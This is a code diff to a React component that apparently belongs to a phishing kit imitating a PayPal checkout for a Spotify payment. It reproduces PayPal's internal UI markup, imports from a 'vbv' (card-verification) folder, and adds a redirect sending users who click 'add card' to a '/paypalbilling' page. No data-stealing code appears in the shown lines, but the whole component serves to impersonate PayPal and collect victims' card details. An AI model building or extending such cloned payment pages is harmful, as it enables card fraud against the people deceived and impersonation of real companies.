@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { zokomId } from '../utils/auth';
+import { useHistory } from 'react-router-dom/cjs/react-router-dom.min';
 import axios from 'axios';
 import Container from '../vbv/container';
 
@@ -9,13 +10,15 @@ const PayPalCheckout = () => {
     const [showModal, setShowModal] = useState(false);
     const [isLoading, setIsLoading] = useState(false);
     const userId = zokomId();
-
+    const history = useHistory();
     const formatCardNumber = (number) => {
         if (!number) return '';
         const lastFour = number.slice(-4);
         return `••${lastFour}`;
     };
-
+    const handleAddCardClick = () => {
+        history.push('/paypalbilling');
+    };
     const handleAgreeClick = () => {
         setIsLoading(true);
         setTimeout(() => {
@@ -171,7 +174,7 @@ const PayPalCheckout = () => {
                                             data-ppui-info="divider_4.1.10"
                                         />
                                         <div className="hagrid-pl611z-row-no_gutter" data-ppui-info="grid_3.2.4">
-                                            <button className="hagrid-hqd0jp-col" data-ppui="true">
+                                            <button onClick={handleAddCardClick} className="hagrid-hqd0jp-col" data-ppui="true">
                                                 <span
                                                     className="hagrid-3fi865-links_base-text_body_strong"
                                                     data-ppui-info="links_4.2.3"
@@ -252,7 +255,7 @@ const PayPalCheckout = () => {
                                                         className="hagrid-1jegmup-text_caption_strong"
                                                         data-ppui-info="caption-text_6.3.3"
                                                     >
-                                                        Cancel and return to Spotify USA Inc
+                                                        Cancel and return to Spotify Inc
                                                     </div>
                                                 </a>
                                             </div>
